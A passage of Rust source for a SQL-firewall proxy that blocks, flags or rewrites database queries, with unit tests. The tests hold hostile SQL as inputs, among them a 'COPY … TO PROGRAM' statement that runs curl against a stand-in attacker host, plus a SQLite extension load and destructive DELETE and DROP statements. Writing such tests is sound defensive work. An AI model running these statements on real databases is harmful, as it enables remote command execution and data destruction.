// SPDX-FileCopyrightText: 2026 Vericto S.A.S.
// SPDX-License-Identifier: FSL-1.1-ALv2

//! Bridge between the TCP proxy and the AST evaluation engine (in-process).
//!
//! The TCP proxy calls the existing parser and `RuleEngine` directly, without
//! going through HTTP. This keeps latency minimal on the critical path.

use vericto_engine::parser::{Dialect, parser_for};
use vericto_engine::{
    ACCESS_RULE_CODE, AccessMode, Decision, DeniedRef, EnforcementAction, EnforcementPolicy,
    EvaluationOutcome, Needed, ParseErrorAction, ReportedViolation, Rule, RuleEngine,
    SensitivePolicy, Severity, TouchedColumn,
};

use vericto_engine::policy::{EvalContext, PolicyOutcome, PolicySet};

use crate::tcp::policy_rules::PolicyRulesMode;
use crate::tcp::protocol::QueryKind;

/// Rule code of every sensitive-column outcome (engine contract §3.1), including
/// the proxy's own fail-safe blocks below.
pub const SENSITIVE_RULE_CODE: &str = "VERICTO-085";

/// Result of evaluating a query on the TCP path. `Clone` for the telemetry
/// event built off the query path (`telemetry::builder`).
#[derive(Clone)]
pub enum TcpDecision {
    /// Forward to the real DB. `observation` carries violation info when the
    /// action was Flag or Monitor (for telemetry), the parse-error allow-report
    /// observation, or None when no rule matched.
    Forward {
        observation: Option<Observation>,
        /// Every rule the query violated, winner first. Carried alongside the
        /// observation rather than inside it because a parse-error observation has
        /// no engine violations to report.
        violations: Vec<ReportedViolation>,
        /// The SQL to send INSTEAD of the original: a `mask` tag was applied,
        /// or (4.17.0, policy rules `enforce`) a `rewrite_limit` business policy
        /// bounded the statement, on top of the mask when both apply (Postgres
        /// and MySQL). When `Some`, the session forwards this text and never the
        /// original; `evaluate` has already checked it is consistent.
        rewritten_query: Option<String>,
        /// Every tagged column the query reads (VERICTO-085), for the audit trail.
        sensitive_columns: Vec<TouchedColumn>,
        /// Every reference the session user's allowlist denied (VERICTO-087),
        /// for the audit trail. Non-empty on a forward under `mode = observe`.
        access_denied: Vec<DeniedRef>,
    },
    /// Reject the query with SQLSTATE 42501.
    Block {
        rule_code: String,
        ast_node_path: String,
        suggested_safe_query: Option<String>,
        severity: Severity,
        /// Every rule the query violated, winner first. The block itself is
        /// decided by the winner alone; this is the audit trail, and reporting it
        /// cannot change the decision.
        violations: Vec<ReportedViolation>,
        /// Every tagged column the query would have read (VERICTO-085).
        sensitive_columns: Vec<TouchedColumn>,
        /// Every reference the session user's allowlist denied (VERICTO-087).
        access_denied: Vec<DeniedRef>,
    },
}

impl TcpDecision {
    /// A block raised by the proxy itself because a mask could not be enforced
    /// as the engine described it. Never forwards anything: the alternative to a
    /// rewrite the proxy cannot trust is the unmasked original.
    fn sensitive_block(
        reason: &str,
        violations: Vec<ReportedViolation>,
        sensitive_columns: Vec<TouchedColumn>,
        access_denied: Vec<DeniedRef>,
    ) -> Self {
        TcpDecision::Block {
            rule_code: SENSITIVE_RULE_CODE.to_string(),
            ast_node_path: format!("SensitiveColumn > mask not enforceable by the proxy: {reason}"),
            suggested_safe_query: None,
            // The engine's severity for a block or mask outcome (contract §3.1).
            severity: Severity::High,
            violations,
            sensitive_columns,
            access_denied,
        }
    }
}

/// A block raised by the proxy itself because the rewrite of a statement
/// (`rewritten`, when the engine returned one) cannot be enforced as the
/// engine described it: never the original instead. A mask (or no rewrite at
/// all) is VERICTO-085, as before 4.17.0; a `rewrite_limit` bound without a
/// mask is reported under the policy that asked for it, whose finding carries
/// the bounded text as its suggestion (engine 4.5.0).
pub fn rewrite_not_enforceable(
    reason: &str,
    rewritten: Option<&str>,
    violations: Vec<ReportedViolation>,
    sensitive_columns: Vec<TouchedColumn>,
    access_denied: Vec<DeniedRef>,
) -> TcpDecision {
    let masked = sensitive_columns
        .iter()
        .any(|c| c.policy == SensitivePolicy::Mask);
    let bound = rewritten.filter(|_| !masked).and_then(|r| {
        violations
            .iter()
            .find(|v| v.suggested_safe_query.as_deref() == Some(r))
            .map(|v| (v.rule_code.clone(), v.severity))
    });
    match bound {
        Some((rule_code, severity)) => TcpDecision::Block {
            ast_node_path: format!(
                "Policy > {rule_code}: LIMIT rewrite not enforceable by the proxy: {reason}"
            ),
            rule_code,
            suggested_safe_query: None,
            severity,
            violations,
            sensitive_columns,
            access_denied,
        },
        None => TcpDecision::sensitive_block(reason, violations, sensitive_columns, access_denied),
    }
}

/// The VERICTO-087 outcome of a protocol command refused under an allowlist
/// ([`crate::tcp::protocol::AccessControl`]): the same shape the engine gives a
/// denied statement (`AccessPolicy > <label> (ddl): denied for this identity`,
/// High, one `ddl` reference). Blocks under `enforce`; flags (and forwards)
/// under `observe` and under `monitor_mode`, as the engine does.
pub fn access_command_decision(label: &str, mode: AccessMode, monitor_mode: bool) -> TcpDecision {
    let ast_node_path = format!("AccessPolicy > {label} (ddl): denied for this identity");
    let block = mode == AccessMode::Enforce && !monitor_mode;
    let action = if block {
        EnforcementAction::Block
    } else {
        EnforcementAction::Flag
    };
    let violations = vec![ReportedViolation {
        rule_id: ACCESS_RULE_CODE.to_string(),
        rule_code: ACCESS_RULE_CODE.to_string(),
        severity: Severity::High,
        action,
        ast_node_path: ast_node_path.clone(),
        estimated_rows_affected: None,
        suggested_safe_query: None,
    }];
    let access_denied = vec![DeniedRef {
        schema: None,
        table: label.to_string(),
        column: None,
        needed: Needed::Ddl,
    }];
    if block {
        TcpDecision::Block {
            rule_code: ACCESS_RULE_CODE.to_string(),
            ast_node_path,
            suggested_safe_query: None,
            severity: Severity::High,
            violations,
            sensitive_columns: Vec::new(),
            access_denied,
        }
    } else {
        TcpDecision::Forward {
            observation: Some(Observation {
                rule_code: ACCESS_RULE_CODE.to_string(),
                ast_node_path,
                severity: Severity::High,
                action,
                parse_error: None,
            }),
            violations,
            rewritten_query: None,
            sensitive_columns: Vec::new(),
            access_denied,
        }
    }
}

/// A non-blocking violation (or parse-error allow-report) recorded for telemetry.
#[derive(Clone)]
pub struct Observation {
    pub rule_code: String,
    pub ast_node_path: String,
    pub severity: Severity,
    /// Flag | Monitor (or Flag for a parse-error allow_report observation).
    pub action: EnforcementAction,
    /// Some when this is a parse-error observation; carries the parser message.
    pub parse_error: Option<String>,
}

/// Evaluates a SQL query against the given ruleset, resolving the winning
/// violation's action via the workspace `policy`.
///
/// - Parse OK → `RuleEngine::evaluate`; `Decision::Block` maps to `Block`,
///   `Decision::Flag`/`Decision::Allow` map to `Forward` carrying an
///   `Observation` built from the resolved action (None when no rule matched).
///   A `Forward` carries the engine's `rewritten_query` when a mask applied;
///   if the outcome does not hold together (see [`rewrite_inconsistency`]) the
///   query is blocked instead. (`rewrite_limit` needs policies: see
///   [`evaluate_message_with`].)
/// - Parse error → resolved from `policy.effective_parse_error_for(sql, dialect)`:
///   `AllowReport` (fail-open default) forwards with a parse-error
///   `Observation`; `Block` (fail-closed opt-in, and forced by any `block` or
///   `mask` sensitive column) rejects with `VERICTO-PARSE-ERROR`.
pub fn evaluate(
    sql: &str,
    dialect: Dialect,
    rules: &[Rule],
    policy: &EnforcementPolicy,
) -> TcpDecision {
    let parser = parser_for(dialect);
    match parser.parse(sql) {
        Ok(parsed) => decide(
            RuleEngine::evaluate(&parsed, rules, policy),
            dialect,
            policy,
        ),
        // `effective_parse_error`, not the raw `parse_error`: with a `block` or
        // `mask` tag configured a query the engine cannot read cannot be shown not
        // to read the column, so it blocks whatever the workspace chose (engine
        // contract §3.2). Without such tags the two are identical.
        // `_for(sql, dialect)`: an enforced agent allowlist also forces a block,
        // except for the session statements drivers send on connect that the
        // parser cannot read (engine contract §8, v3).
        Err(e) => match policy.effective_parse_error_for(sql, dialect) {
            // Fail-open default (R5.5): forward + report.
            ParseErrorAction::AllowReport => TcpDecision::Forward {
                // A query that did not parse violated no rule: there is nothing to
                // enumerate, and the parse error itself travels in the observation.
                violations: Vec::new(),
                observation: Some(Observation {
                    rule_code: "VERICTO-PARSE-ERROR".to_string(),
                    ast_node_path: format!("PARSE_ERROR: {e}"),
                    // Parse-error telemetry severity is Medium by product decision (R8.6).
                    severity: Severity::Medium,
                    action: EnforcementAction::Flag,
                    parse_error: Some(e.to_string()),
                }),
                rewritten_query: None,
                sensitive_columns: Vec::new(),
                access_denied: Vec::new(),
            },
            // Fail-closed (R5.6): reject with 42501.
            ParseErrorAction::Block => TcpDecision::Block {
                rule_code: "VERICTO-PARSE-ERROR".to_string(),
                ast_node_path: format!("PARSE_ERROR: {e}"),
                suggested_safe_query: None,
                severity: Severity::Medium,
                violations: Vec::new(),
                sensitive_columns: Vec::new(),
                access_denied: Vec::new(),
            },
        },
    }
}

/// The decision for an engine outcome of a statement that parsed: a block
/// blocks; anything else forwards, with the engine's rewrite when a mask
/// applied, unless the outcome does not hold together (see
/// [`rewrite_inconsistency`]), which blocks.
fn decide(outcome: EvaluationOutcome, dialect: Dialect, policy: &EnforcementPolicy) -> TcpDecision {
    if outcome.decision != Decision::Block
        && let Some(reason) = rewrite_inconsistency(&outcome, dialect, policy)
    {
        tracing::error!(
            reason,
            "rewrite outcome is inconsistent; blocking rather than forwarding"
        );
        return rewrite_not_enforceable(
            reason,
            outcome.rewritten_query.as_deref(),
            outcome.violations,
            outcome.sensitive_columns,
            outcome.access_denied,
        );
    }
    match outcome.decision {
        Decision::Block => TcpDecision::Block {
            rule_code: outcome.rule_code.unwrap_or_else(|| "VERICTO".to_string()),
            ast_node_path: outcome.ast_node_path.unwrap_or_default(),
            suggested_safe_query: outcome.suggested_safe_query,
            severity: outcome.severity.unwrap_or(Severity::Critical),
            violations: outcome.violations,
            sensitive_columns: outcome.sensitive_columns,
            access_denied: outcome.access_denied,
        },
        // The outcome is ours: its strings move into the observation (no copy per
        // flagged statement).
        Decision::Flag | Decision::Allow => TcpDecision::Forward {
            observation: outcome.action.map(|action| Observation {
                rule_code: outcome.rule_code.unwrap_or_else(|| "VERICTO".to_string()),
                ast_node_path: outcome.ast_node_path.unwrap_or_default(),
                severity: outcome.severity.unwrap_or(Severity::Medium),
                action,
                parse_error: None,
            }),
            violations: outcome.violations,
            rewritten_query: outcome.rewritten_query,
            sensitive_columns: outcome.sensitive_columns,
            access_denied: outcome.access_denied,
        },
    }
}

/// [`evaluate`], plus the checks that depend on how the query arrived.
///
/// A prepared statement (Postgres `Parse`, MySQL `COM_STMT_PREPARE`) is
/// followed by values the client binds to the parameters of the statement it
/// sent. A rewrite that changes those parameters no longer fits the client's
/// `Bind` / `COM_STMT_EXECUTE`, so it is refused here, with a message that says
/// why, instead of forwarding a statement that fails later with a confusing
/// protocol error (or, on MySQL, binds a value to the wrong `?`). The engine
/// keeps every parameter (3.6.1 for `$n`, 3.7.0 for `?`); this is the proxy not
/// taking that on trust. Checked before telemetry so the event records what
/// actually happened.
pub fn evaluate_message(
    sql: &str,
    dialect: Dialect,
    kind: QueryKind,
    rules: &[Rule],
    policy: &EnforcementPolicy,
) -> TcpDecision {
    checked_for_kind(evaluate(sql, dialect, rules, policy), sql, dialect, kind)
}

/// What a statement is evaluated with when `VERICTO_POLICY_RULES` is on.
pub struct PolicyEval<'a> {
    pub mode: PolicyRulesMode,
    pub policies: &'a PolicySet,
    pub ctx: &'a EvalContext,
}

/// [`evaluate_message`] with the business policies.
///
/// `None`, `off` or an empty policy set: exactly [`evaluate_message`] (an
/// empty set is what `evaluate_with_context` itself short-cuts to).
/// `enforce`: the engine's `evaluate_with_context` decides, including the
/// parse-error block it forces when an enforced blocking policy may apply,
/// and a `rewrite_limit` bound (engine 4.5.0), which forwards the bounded
/// statement (`rewritten_query`) like a mask.
/// `observe`: the verdict is [`evaluate`]'s, and what the policies found is
/// added to it as flags (see [`observed`]); a `rewrite_limit` is reported
/// (its would-be text as the finding's suggestion), never applied.
pub fn evaluate_message_with(
    sql: &str,
    dialect: Dialect,
    kind: QueryKind,
    rules: &[Rule],
    policy: &EnforcementPolicy,
    policies: Option<&PolicyEval<'_>>,
) -> TcpDecision {
    let decision = match policies {
        Some(pe) if pe.mode.is_on() && !pe.policies.is_empty() => {
            let outcome = vericto_engine::evaluate_with_context(
                sql,
                dialect,
                rules,
                policy,
                pe.policies,
                pe.ctx,
            );
            match pe.mode {
                PolicyRulesMode::Enforce => from_outcome(outcome, dialect, policy),
                _ => observed(evaluate(sql, dialect, rules, policy), outcome, pe.policies),
            }
        }
        _ => evaluate(sql, dialect, rules, policy),
    };
    checked_for_kind(decision, sql, dialect, kind)
}

/// The decision for any outcome of `evaluate_with_context`, a parse error
/// included (the engine reports it as `VERICTO-PARSE-ERROR`, Block or Flag).
fn from_outcome(
    outcome: EvaluationOutcome,
    dialect: Dialect,
    policy: &EnforcementPolicy,
) -> TcpDecision {
    if outcome.parse_error_kind().is_none() {
        return decide(outcome, dialect, policy);
    }
    let path = outcome.ast_node_path.unwrap_or_default();
    let message = path
        .strip_prefix("PARSE_ERROR: ")
        .unwrap_or(&path)
        .to_string();
    if outcome.decision == Decision::Block {
        TcpDecision::Block {
            rule_code: "VERICTO-PARSE-ERROR".to_string(),
            ast_node_path: path,
            suggested_safe_query: None,
            severity: Severity::Medium,
            violations: Vec::new(),
            sensitive_columns: Vec::new(),
            access_denied: Vec::new(),
        }
    } else {
        TcpDecision::Forward {
            violations: Vec::new(),
            observation: Some(Observation {
                rule_code: "VERICTO-PARSE-ERROR".to_string(),
                ast_node_path: path,
                severity: Severity::Medium,
                action: EnforcementAction::Flag,
                parse_error: Some(message),
            }),
            rewritten_query: None,
            sensitive_columns: Vec::new(),
            access_denied: Vec::new(),
        }
    }
}

/// `observe`: `baseline` (the verdict without policies) unchanged, with what
/// the policies found added to its violations, every block lowered to a flag.
/// A statement the policies alone would have blocked (or flagged) is reported
/// FLAGGED; one that was allowed stays forwarded; a rewrite, a mask and every
/// non-policy block stay exactly as `evaluate()` decided them. Exemptions are
/// not applied: they only ever loosen, and observe never changes a verdict.
fn observed(
    baseline: TcpDecision,
    outcome: EvaluationOutcome,
    policies: &PolicySet,
) -> TcpDecision {
    let lower = |a: EnforcementAction| a.min(EnforcementAction::Flag);
    let mut found: Vec<ReportedViolation> = outcome
        .violations
        .into_iter()
        .filter(|v| policies.contains_rule(&v.rule_id))
        .map(|mut v| {
            v.action = lower(v.action);
            v
        })
        .collect();
    // Policy results with no violation of their own (a statement the engine
    // could not read under an enforced policy, insufficient trust, a policy
    // that does not compile), when they ask for an action.
    for hit in &outcome.policy_hits {
        if let Some(action) = hit.action
            && !found.iter().any(|v| v.rule_code == hit.rule_code)
        {
            found.push(ReportedViolation {
                rule_id: hit.rule_id.clone(),
                rule_code: hit.rule_code.clone(),
                severity: hit.severity,
                action: lower(action),
                ast_node_path: format!("Policy > {}", hit.message),
                estimated_rows_affected: None,
                suggested_safe_query: None,
            });
        }
    }
    if found.is_empty() {
        return baseline;
    }
    found.sort_by(|a, b| {
        b.action
            .cmp(&a.action)
            .then_with(|| b.severity.cmp(&a.severity))
            .then_with(|| a.rule_code.cmp(&b.rule_code))
    });
    let add = |violations: &mut Vec<ReportedViolation>, found: Vec<ReportedViolation>| {
        for v in found {
            if !violations.iter().any(|o| o.rule_code == v.rule_code) {
                violations.push(v);
            }
        }
    };
    match baseline {
        TcpDecision::Forward {
            observation,
            mut violations,
            rewritten_query,
            sensitive_columns,
            access_denied,
        } => {
            let observation = observation.or_else(|| {
                found.first().map(|v| Observation {
                    rule_code: v.rule_code.clone(),
                    ast_node_path: v.ast_node_path.clone(),
                    severity: v.severity,
                    action: v.action,
                    parse_error: None,
                })
            });
            add(&mut violations, found);
            TcpDecision::Forward {
                observation,
                violations,
                rewritten_query,
                sensitive_columns,
                access_denied,
            }
        }
        TcpDecision::Block {
            rule_code,
            ast_node_path,
            suggested_safe_query,
            severity,
            mut violations,
            sensitive_columns,
            access_denied,
        } => {
            add(&mut violations, found);
            TcpDecision::Block {
                rule_code,
                ast_node_path,
                suggested_safe_query,
                severity,
                violations,
                sensitive_columns,
                access_denied,
            }
        }
    }
}

/// The parameter check of [`evaluate_message`] on an already evaluated query.
fn checked_for_kind(
    decision: TcpDecision,
    sql: &str,
    dialect: Dialect,
    kind: QueryKind,
) -> TcpDecision {
    match decision {
        TcpDecision::Forward {
            rewritten_query: Some(ref rewritten),
            ..
        } if kind == QueryKind::Prepared => match parameter_mismatch(sql, rewritten, dialect) {
            None => decision,
            Some(reason) => {
                let TcpDecision::Forward {
                    violations,
                    rewritten_query,
                    sensitive_columns,
                    access_denied,
                    ..
                } = decision
                else {
                    unreachable!()
                };
                rewrite_not_enforceable(
                    &reason,
                    rewritten_query.as_deref(),
                    violations,
                    sensitive_columns,
                    access_denied,
                )
            }
        },
        other => other,
    }
}

/// Why an engine outcome that is not a block cannot be enforced as it stands,
/// or `None` when it can. Any `Some` blocks the query: every way of being
/// inconsistent leaves the proxy with only the original SQL to forward, which is
/// exactly what a mask tag forbids.
///
/// The engine guarantees none of these happen (contract §3.2/§3.3); this is the
/// proxy not taking that on trust for the one decision where trusting it wrongly
/// leaks the column.
///
/// A rewrite is accounted for by a masked column or (engine 4.5.0) by a
/// `rewrite_limit` policy that bounded the statement (a `Rewritten` policy
/// hit). Policy hits only exist on the policy path (`evaluate_with_context`,
/// policy rules `enforce`), so with policy rules off a rewrite without a mask
/// is refused exactly as before. The hits are only looked at when a rewrite
/// came back without a mask: nothing is added to any other statement.
fn rewrite_inconsistency(
    outcome: &EvaluationOutcome,
    dialect: Dialect,
    policy: &EnforcementPolicy,
) -> Option<&'static str> {
    let masked = outcome
        .sensitive_columns
        .iter()
        .any(|c| c.policy == SensitivePolicy::Mask);
    match &outcome.rewritten_query {
        Some(_) if !matches!(dialect, Dialect::Postgres | Dialect::Mysql) => {
            Some("a rewritten query was returned for a dialect the rewrite does not support")
        }
        Some(_)
            if !masked
                && !outcome
                    .policy_hits
                    .iter()
                    .any(|h| h.outcome == PolicyOutcome::Rewritten) =>
        {
            Some(
                "a rewritten query was returned but no masked column was read and no LIMIT \
                 rewrite applied",
            )
        }
        Some(sql) if sql.trim().is_empty() || sql.contains('\0') => {
            Some("the rewritten query is empty or not valid wire text")
        }
        Some(_) => None,
        // monitor_mode is the one case where a masked read legitimately forwards
        // the original: dry-run never changes what runs (contract §3.2).
        None if masked && !policy.monitor_mode => {
            Some("a masked column was read but no rewritten query was returned")
        }
        None => None,
    }
}

/// `$n` placeholders of a Postgres statement, sorted and deduplicated. `None`
/// when it does not parse.
fn placeholders(sql: &str) -> Option<Vec<i32>> {
    let parsed = pg_query::parse(sql).ok()?;
    let mut n: Vec<i32> = parsed
        .protobuf
        .nodes()
        .into_iter()
        .filter_map(|(node, ..)| match node {
            pg_query::NodeRef::ParamRef(p) => Some(p.number),
            _ => None,
        })
        .collect();
    n.sort_unstable();
    n.dedup();
    Some(n)
}

/// Number of `?` parameters of a MySQL statement, counted with the MySQL lexer
/// (as the server counts them: not inside a string, a quoted identifier or a
/// comment). `None` when it does not lex.
fn mysql_placeholders(sql: &str) -> Option<usize> {
    let tokens = crate::tcp::protocol::mysql::mysql_tokens(sql).ok()?;
    Some(
        tokens
            .iter()
            .filter(
                |t| matches!(t, sqlparser::tokenizer::Token::Placeholder(p) if p.starts_with('?')),
            )
            .count(),
    )
}

/// Why `rewritten` cannot be bound with the parameters the client prepared
/// `original` for, or `None` when it can.
fn parameter_mismatch(original: &str, rewritten: &str, dialect: Dialect) -> Option<String> {
    match dialect {
        Dialect::Mysql => mysql_parameter_mismatch(original, rewritten),
        _ => postgres_parameter_mismatch(original, rewritten),
    }
}

/// MySQL `?` are positional: the server reports their count in
/// COM_STMT_PREPARE_OK and the client binds that many values, in order. The
/// engine keeps them in order (contract §10.3); the proxy checks the count,
/// which is what the client's COM_STMT_EXECUTE depends on.
fn mysql_parameter_mismatch(original: &str, rewritten: &str) -> Option<String> {
    let (Some(before), Some(after)) = (mysql_placeholders(original), mysql_placeholders(rewritten))
    else {
        return Some("the rewritten statement could not be checked for parameters".to_string());
    };
    (before != after).then(|| {
        format!(
            "the rewrite (a mask or a LIMIT bound) changes the number of `?` parameters from \
             {before} to {after}, so the values the client binds would no longer fit; select \
             the column itself, or compute on it without a parameter"
        )
    })
}

fn postgres_parameter_mismatch(original: &str, rewritten: &str) -> Option<String> {
    let (Some(before), Some(after)) = (placeholders(original), placeholders(rewritten)) else {
        return Some("the rewritten statement could not be checked for parameters".to_string());
    };
    if before == after {
        return None;
    }
    let lost: Vec<String> = before
        .iter()
        .filter(|n| !after.contains(n))
        .map(|n| format!("${n}"))
        .collect();
    Some(if lost.is_empty() {
        "the rewritten statement has different parameters".to_string()
    } else {
        format!(
            "masking removes parameter {} (it is used inside a masked expression); \
             select the column itself, or compute on it without a parameter",
            lost.join(", ")
        )
    })
}

/// Default ruleset: the engine's standard ruleset (`vericto_engine::standard_rules()`),
/// every built-in rule at its canonical severity and default action. The proxy
/// evaluates with it before its first rule sync and whenever a sync fails. The
/// engine keeps that table equal to its README catalogue and its evaluator
/// (`tests/rule_catalogue_sync.rs` there), so the proxy keeps no copy of it.
///
/// In production this ruleset would be resolved per workspace (querying the
/// API or database based on the `database` from the StartupMessage). For
/// single-tenant / dev mode these built-ins are the safe minimum.
pub fn default_ruleset() -> Vec<Rule> {
    vericto_engine::standard_rules()
}

#[cfg(test)]
mod tests {
    use super::*;

    // The R13 table (code, severity, default_action) — the authoritative source
    // of truth. `default_ruleset()` must match this verbatim (task 5.9).
    const R13: &[(&str, Severity, EnforcementAction)] = &[
        ("VERICTO-001", Severity::Critical, EnforcementAction::Block),
        ("VERICTO-003", Severity::Critical, EnforcementAction::Block),
        ("VERICTO-010", Severity::Critical, EnforcementAction::Block),
        ("VERICTO-011", Severity::Critical, EnforcementAction::Block),
        ("VERICTO-012", Severity::Critical, EnforcementAction::Block),
        ("VERICTO-030", Severity::Critical, EnforcementAction::Block),
        ("VERICTO-042", Severity::Critical, EnforcementAction::Block),
        ("VERICTO-090", Severity::Critical, EnforcementAction::Block),
        ("VERICTO-080", Severity::Critical, EnforcementAction::Block),
        ("VERICTO-081", Severity::Critical, EnforcementAction::Block),
        ("VERICTO-086", Severity::Critical, EnforcementAction::Block),
        ("VERICTO-091", Severity::Critical, EnforcementAction::Block),
        ("VERICTO-092", Severity::Critical, EnforcementAction::Block),
        ("VERICTO-093", Severity::Critical, EnforcementAction::Block),
        ("VERICTO-100", Severity::Critical, EnforcementAction::Block),
        ("VERICTO-002", Severity::High, EnforcementAction::Block),
        ("VERICTO-013", Severity::High, EnforcementAction::Block),
        ("VERICTO-015", Severity::High, EnforcementAction::Block),
        ("VERICTO-016", Severity::High, EnforcementAction::Block),
        ("VERICTO-017", Severity::High, EnforcementAction::Block),
        ("VERICTO-018", Severity::High, EnforcementAction::Block),
        ("VERICTO-019", Severity::High, EnforcementAction::Block),
        ("VERICTO-031", Severity::High, EnforcementAction::Block),
        ("VERICTO-033", Severity::High, EnforcementAction::Block),
        ("VERICTO-040", Severity::High, EnforcementAction::Block),
        ("VERICTO-070", Severity::High, EnforcementAction::Block),
        ("VERICTO-082", Severity::High, EnforcementAction::Block),
        ("VERICTO-083", Severity::High, EnforcementAction::Block),
        ("VERICTO-084", Severity::High, EnforcementAction::Block),
        ("VERICTO-085", Severity::High, EnforcementAction::Block),
        ("VERICTO-087", Severity::High, EnforcementAction::Block),
        ("VERICTO-094", Severity::High, EnforcementAction::Block),
        ("VERICTO-095", Severity::High, EnforcementAction::Block),
        ("VERICTO-096", Severity::High, EnforcementAction::Block),
        ("VERICTO-097", Severity::High, EnforcementAction::Block),
        ("VERICTO-098", Severity::High, EnforcementAction::Block),
        ("VERICTO-099", Severity::High, EnforcementAction::Block),
        ("VERICTO-101", Severity::High, EnforcementAction::Block),
        ("VERICTO-050", Severity::Medium, EnforcementAction::Flag),
        ("VERICTO-051", Severity::Medium, EnforcementAction::Flag),
        ("VERICTO-061", Severity::Medium, EnforcementAction::Flag),
        ("VERICTO-060", Severity::Low, EnforcementAction::Monitor),
    ];

    // Task 5.9 — default_ruleset() holds exactly the R13 table. The engine's
    // standard ruleset is in code order, and since engine 4.2.0 the decision does
    // not depend on the order of the rules, so the comparison is by code.
    #[test]
    fn default_ruleset_matches_r13_table_verbatim() {
        let ruleset = default_ruleset();
        assert_eq!(
            ruleset.len(),
            R13.len(),
            "default_ruleset() must have exactly the R13 entries"
        );
        let by_code: std::collections::BTreeMap<&str, &Rule> =
            ruleset.iter().map(|r| (r.code.as_str(), r)).collect();
        assert_eq!(by_code.len(), R13.len(), "no duplicate codes");
        for (code, severity, action) in R13 {
            let rule = by_code
                .get(code)
                .unwrap_or_else(|| panic!("{code} missing from default_ruleset()"));
            assert_eq!(&rule.rule_id, code, "rule_id should equal the code");
            assert_eq!(rule.severity, *severity, "severity mismatch for {code}");
            assert_eq!(
                rule.default_action, *action,
                "default_action mismatch for {code}"
            );
            assert_eq!(rule.rule_type, vericto_engine::RuleType::Standard, "{code}");
            assert!(rule.ast_condition_yaml.is_none(), "{code}");
        }
    }

    /// The SQLite rules (and VERICTO-070's SQLite probe) are in the built-in
    /// catalogue only so it is whole: SQLite has no wire protocol, and on the
    /// Postgres and MySQL protocols this proxy serves they never fire.
    #[test]
    fn sqlite_rules_never_fire_on_the_wire_dialects() {
        let rules = default_ruleset();
        let policy = EnforcementPolicy::default();
        for sql in [
            "ATTACH DATABASE '/tmp/x.db' AS x",
            "PRAGMA foreign_keys = OFF",
            "PRAGMA writable_schema = ON",
            "SELECT load_extension('/tmp/x.so')",
            "VACUUM INTO '/tmp/copy.db'",
            "SELECT 1 WHERE randomblob(1000000000) IS NOT NULL",
            "UPDATE docs SET body = zeroblob(1000000000) WHERE id = 1",
        ] {
            for dialect in [Dialect::Postgres, Dialect::Mysql] {
                let violations = match evaluate(sql, dialect, &rules, &policy) {
                    TcpDecision::Forward { violations, .. } => violations,
                    TcpDecision::Block { violations, .. } => violations,
                };
                assert!(
                    !violations.iter().any(|v| matches!(
                        v.rule_code.as_str(),
                        "VERICTO-070"
                            | "VERICTO-098"
                            | "VERICTO-099"
                            | "VERICTO-100"
                            | "VERICTO-101"
                    )),
                    "{dialect:?} {sql}: {violations:?}"
                );
            }
        }
    }

    #[test]
    fn default_ruleset_vericto_050_is_medium_flag() {
        let ruleset = default_ruleset();
        let r = ruleset
            .iter()
            .find(|r| r.code == "VERICTO-050")
            .expect("VERICTO-050 present");
        assert_eq!(r.severity, Severity::Medium);
        assert_eq!(r.default_action, EnforcementAction::Flag);
    }

    // ── TcpDecision mapping (task 5.7) ────────────────────────────────────────

    // A DELETE without WHERE (VERICTO-001, Critical/Block) must Block.
    #[test]
    fn block_decision_does_not_forward() {
        let rules = default_ruleset();
        let policy = EnforcementPolicy::default();
        let decision = evaluate("DELETE FROM users", Dialect::Postgres, &rules, &policy);
        match decision {
            TcpDecision::Block {
                rule_code,
                severity,
                ..
            } => {
                assert_eq!(rule_code, "VERICTO-001");
                assert_eq!(severity, Severity::Critical);
            }
            TcpDecision::Forward { .. } => panic!("destructive query must Block, not Forward"),
        }
    }

    // Engine 4.2.0: the decision is the strongest resolved action across all the
    // violations. A workspace policy that softens Critical to Flag no longer lets
    // the (softened) DROP decide for a script that also holds a High violation
    // that blocks; with engine 4.1.3 this script was forwarded as a Flag.
    #[test]
    fn a_softened_violation_does_not_outvote_one_that_blocks() {
        let rules = default_ruleset();
        let policy = EnforcementPolicy {
            critical: EnforcementAction::Flag,
            ..EnforcementPolicy::default()
        };
        let sql = "DROP TABLE a; INSERT INTO archive SELECT * FROM accounts";
        match evaluate(sql, Dialect::Postgres, &rules, &policy) {
            TcpDecision::Block {
                rule_code,
                severity,
                ..
            } => {
                assert_eq!(rule_code, "VERICTO-040");
                assert_eq!(severity, Severity::High);
            }
            TcpDecision::Forward { violations, .. } => {
                panic!("must Block on VERICTO-040, was forwarded: {violations:?}")
            }
        }
    }

    // A COPY … TO PROGRAM (VERICTO-080, Critical/Block) must Block via the
    // built-in default_ruleset — proves the new dangerous-statement codes are
    // wired into the proxy's fallback catalogue.
    #[test]
    fn copy_program_blocks_via_default_ruleset() {
        let rules = default_ruleset();
        let policy = EnforcementPolicy::default();
        let decision = evaluate(
            "COPY users TO PROGRAM 'curl https://evil.example'",
            Dialect::Postgres,
            &rules,
            &policy,
        );
        match decision {
            TcpDecision::Block {
                rule_code,
                severity,
                ..
            } => {
                assert_eq!(rule_code, "VERICTO-080");
                assert_eq!(severity, Severity::Critical);
            }
            TcpDecision::Forward { .. } => panic!("COPY … PROGRAM must Block"),
        }
    }

    // A SELECT without LIMIT (VERICTO-050, Medium/Flag) must Forward with an
    // Observation carrying the Flag action.
    #[test]
    fn flag_decision_forwards_with_observation() {
        let rules = default_ruleset();
        let policy = EnforcementPolicy::default();
        let decision = evaluate("SELECT * FROM users", Dialect::Postgres, &rules, &policy);
        match decision {
            TcpDecision::Forward {
                observation: Some(obs),
                ..
            } => {
                assert_eq!(obs.action, EnforcementAction::Flag);
                assert!(obs.parse_error.is_none());
                assert!(obs.rule_code.starts_with("VERICTO-"));
            }
            TcpDecision::Forward {
                observation: None, ..
            } => {
                panic!("a flagged query must carry an observation")
            }
            TcpDecision::Block { .. } => panic!("a Medium/Flag query must Forward, not Block"),
        }
    }

    // A Low/Monitor rule must Forward with a Monitor observation.
    #[test]
    fn monitor_decision_forwards_with_observation() {
        let rules = default_ruleset();
        let policy = EnforcementPolicy::default();
        // VERICTO-060: INSERT without explicit column list → Low/Monitor.
        let decision = evaluate(
            "INSERT INTO users VALUES (1, 'a')",
            Dialect::Postgres,
            &rules,
            &policy,
        );
        match decision {
            TcpDecision::Forward {
                observation: Some(obs),
                ..
            } => {
                assert_eq!(obs.action, EnforcementAction::Monitor);
                assert!(obs.parse_error.is_none());
            }
            TcpDecision::Forward {
                observation: None, ..
            } => {
                panic!("a monitored query must carry an observation")
            }
